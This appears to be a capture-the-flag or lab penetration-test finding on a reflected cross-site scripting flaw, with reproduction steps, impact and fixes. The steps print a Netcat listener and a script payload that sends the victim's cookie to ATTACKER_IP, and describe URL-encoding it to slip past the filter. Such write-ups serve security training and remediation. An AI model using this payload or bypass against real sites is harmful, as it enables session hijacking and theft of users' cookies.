# Finding 06 — Reflected Cross-Site Scripting (XSS)

| | |
|---|---|
| **Severity** | Medium |
| **Target** | `68.183.xx.xxx` |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
| **Status** | Exploited Successfully |
| **Flag** | `FLAG{unsafe_but_fun_cookie}` |

## Description
A URL query parameter reflects user input back into the page. An in-app hint suggested that "cookies can reveal more than just sessions," pointing toward a cookie-stealing XSS attack. A first plaintext payload was sanitized and rendered inert, but a URL-encoded variant of the same JavaScript payload successfully bypassed the application's input filter and executed in the victim's browser.

## Steps to Reproduce
1. Set up a Netcat listener to capture the exfiltrated cookie:
   ```bash
   nc -lvnp 4444
   ```
   *(Screenshot: `02-listener-start.png`)*
2. Attempt a basic reflected XSS payload in the vulnerable parameter — observe it is sanitized and rendered as plain text:
   ```
   <script>document.location='http://ATTACKER_IP:4444/?c='+document.cookie</script>
   ```
   *(Screenshot: `01-xss-sanitized-attempt.png`)*
3. URL-encode the payload using an online encoder (https://www.urlencoder.org/) to bypass the filter.
   *(Screenshot: `03-url-encoded-payload.png`)*
4. Submit the URL-encoded payload; the script executes, the cookie is exfiltrated to the listener, and Flag 6 is revealed.
   *(Screenshot: `04-xss-bypass-flag6.png`)*

## Proof of Concept — Flag
```
FLAG6: FLAG{unsafe_but_fun_cookie}
```

## Impact
Reflected XSS allows an attacker to execute arbitrary JavaScript in a victim's browser session, enabling session/cookie theft, credential harvesting, and other client-side attacks such as phishing or drive-by actions performed in the victim's authenticated context.

## Recommendation
- Apply proper context-aware output encoding for all reflected user input (HTML entity encoding, attribute encoding, JS encoding as appropriate).
- Do not rely solely on blacklist-based filtering of raw payloads — URL-encoded and otherwise obfuscated variants routinely bypass naive filters.
- Set the `HttpOnly` and `Secure` flags on session cookies to reduce impact of any successful XSS.
- Implement a strict Content Security Policy (CSP).

## References
- OWASP: https://owasp.org/www-community/vulnerabilities/
- OWASP Top Ten: https://owasp.org/www-project-top-ten/

## Screenshots to Add (folder: `Screenshots/XSS/`)
| Filename | Content |
|---|---|
| `01-xss-sanitized-attempt.png` | First plaintext XSS attempt, sanitized/rendered as text |
| `02-listener-start.png` | Netcat listener started to capture cookie exfiltration |
| `03-url-encoded-payload.png` | Payload converted to URL-encoded form |
| `04-xss-bypass-flag6.png` | Successful filter bypass, cookie captured, Flag 6 revealed |
